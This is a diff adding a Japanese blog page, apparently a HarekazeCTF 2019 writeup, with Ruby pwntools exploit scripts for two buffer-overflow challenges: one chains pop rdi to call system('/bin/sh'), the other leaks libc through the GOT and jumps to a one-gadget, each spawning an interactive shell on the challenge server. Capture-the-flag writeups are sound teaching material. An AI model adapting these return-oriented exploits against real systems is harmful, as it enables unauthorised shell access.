@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+
+
+
+<base href="https://alicemacs.com/">
+
+<title>
+  $ make life - HarekazeCTF 2019 writeup 
+</title>
+
+<meta name="generator" content="Hugo 0.54.0" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,400|Roboto+Slab:400,700|Roboto:300,300i,400,400i,500,500i,700,700i">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">
+<link rel="stylesheet" href="https://alicemacs.com/css/main.css">
+<link rel="stylesheet" href="https://alicemacs.com/css/custom.css">
+
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="theme-color" content="#ffffff">
+
+</head>
+<body lang="ja">
+<div class="container">
+
+
+<header class="row text-left title">
+  <h1 class="title">HarekazeCTF 2019 writeup</h1>
+</header>
+<section id="category-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-left meta">
+        PUBLISHED ON MAY 19, 2019 
+      
+      
+      
+      —
+      
+      
+      <a class="meta" href="/categories/writeup">WRITEUP</a>
+      
+      
+      
+    </h6>
+  </div>
+  
+</section>
+<section id="content-pane" class="row">
+  <div class="col-md-12 text-justify content">
+    
+    
+
+<h2 id="baby-rop-1">Baby ROP 1</h2>
+
+<ul>
+<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ</li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+
+require 'pwn'
+
+context.log_level = :debug
+z = Sock.new &quot;problem.harekaze.com&quot;, 20001
+
+pop_rdi_ret = p64(0x00400683)
+system = p64(0x4005e3)
+
+STDIN.gets
+z.recvuntil &quot;? &quot;
+payload = &quot;A&quot; * 24
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(0x601048)
+payload &lt;&lt; system
+
+z.sendline payload
+
+z.interact
+</code></pre>
+
+<ul>
+<li><strong>HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}</strong></li>
+</ul>
+
+<h2 id="baby-rop-2">Baby ROP 2</h2>
+
+<ul>
+<li><code>system</code> 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ</li>
+</ul>
+
+<pre><code class="language-ruby">#!/usr/bin/env ruby
+
+require 'pwn'
+
+context.log_level = :debug
+z = Sock.new &quot;problem.harekaze.com&quot;, 20005
+#z = Sock.new &quot;localhost&quot;, 9999
+elf = ELF.new &quot;./babyrop2&quot;
+libc = ELF.new &quot;./libc.so.6&quot;
+#libc = ELF.new &quot;./mylibc.so.6&quot;
+
+pop_rdi_ret = p64(0x00400733)
+z.recvuntil &quot;? &quot;
+
+payload = &quot;A&quot; * 40
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(elf.got[&quot;__libc_start_main&quot;])
+payload &lt;&lt; p64(0x4004f0)
+payload &lt;&lt; p64(elf.symbols[&quot;main&quot;])
+STDIN.gets
+z.sendline payload
+
+recvlen = &quot;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&quot;.length
+data = z.recvuntil &quot;? &quot;
+p data
+libc_base = u64(data[recvlen, 6].ljust(8, &quot;\x00&quot;)) - libc.symbols[&quot;__libc_start_main&quot;]
+libc_magic = libc_base + 0xf02a4
+puts &quot;libc base 0x%x&quot; % libc_base
+puts &quot;libc magic 0x%x&quot; % libc_magic
+
+payload = &quot;B&quot; * 40
+payload &lt;&lt; p64(libc_magic)
+z.sendline payload
+
+z.interact
+</code></pre>
+
+<ul>
+<li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
+</ul>
+
+<h2 id="login">Login</h2>
+
+<ul>
+<li>解けなかった、脆弱性わからず</li>
+</ul>
+
+<h2 id="harekaze-note">Harekaze Note</h2>
+
+<ul>
+<li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
+</ul>
+
+  </div>
+</section>
+<section id="tag-pane" class="row meta">
+  
+  <div class="col-md-12">
+    <h6 class="text-right meta">
+      
+    </h6>
+  </div>
+  
+</section>
+
+
+
+
+
+
+
+
+<section id="menu-pane" class="row menu text-center">
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/terraform_for_conoha/">&lt; prev | </a></span>
+  
+  
+  <span><a class="menu-item" href="/blog">blog</a></span>
+  
+  
+  <span><a class="menu-item" href="https://alicemacs.com/blog/csaw2019/"> | next &gt;</a></span>
+  
+  
+  <h4 class="text-center"><a class="menu-item" href="https://alicemacs.com/">home</a></h4>
+</section>
+
+
+
+<footer class="row text-center footer">
+  <hr />
+  
+  <h6 class="text-center copyright">© 2019. Chihiro Hasegawa. <a href="https://creativecommons.org/licenses/by/3.0/">Some Rights Reserved</a>.</h6>
+  
+  <h6 class="text-center powered">Powered by <a href="https://gohugo.io/">Hugo  v0.54.0</a> &amp; <a href="https://github.com/shenoybr/hugo-goa">Goa</a>.</h6>
+  
+      
+      <h6><a href="" aria-label="RSS Feed"><i class="fas fa-rss" aria-hidden="true"></i></a></h6>
+    
+  
+</footer>
+
+</div>
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+
+<script type="text/javascript">
+hljs.initHighlightingOnLoad();
+</script>
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js"></script>
+</body>
+</html>
+
+
